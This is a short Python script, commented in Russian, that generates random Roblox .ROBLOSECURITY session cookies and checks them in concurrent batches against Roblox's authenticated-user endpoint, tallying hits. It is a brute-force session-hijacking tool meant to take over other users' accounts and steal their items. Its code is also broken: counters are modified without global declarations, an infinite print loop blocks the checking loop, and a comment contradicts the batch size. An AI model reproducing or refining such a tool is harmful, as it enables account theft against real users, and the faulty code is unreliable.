import asyncio
import aiohttp
import random
invalid = 0
valid = 0
# Функция для генерации случайного кука
def generate_cookie():
    valid_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    rancookie = ''.join((random.choice(valid_letters) for _ in range(1356)))
    return "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + rancookie

# Асинхронная функция для проверки одного кука
async def check_cookie(session, cookie):
    url = 'https://users.roblox.com/v1/users/authenticated'
    cookies = {'.ROBLOSECURITY': cookie}
    
    async with session.get(url, cookies=cookies) as response:
        if "Unauthorized" in await response.text():
            invalid += 1
        else:
            valid += 1

# Асинхронная функция для проверки нескольких куков одновременно
async def check_cookies_concurrently(n):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(n):
            cookie = generate_cookie()
            tasks.append(check_cookie(session, cookie))
        await asyncio.gather(*tasks)

# Главная функция для запуска асинхронных задач
async def main():
    while True:
        print(f"invalid: {invalid}")
        print(f"valid: {valid}")
        await asyncio.sleep(10)
    while True:
        await check_cookies_concurrently(500)  # Проверяем 1000 куков одновременно

# Точка входа в скрипт
if __name__ == "__main__":
    asyncio.run(main())
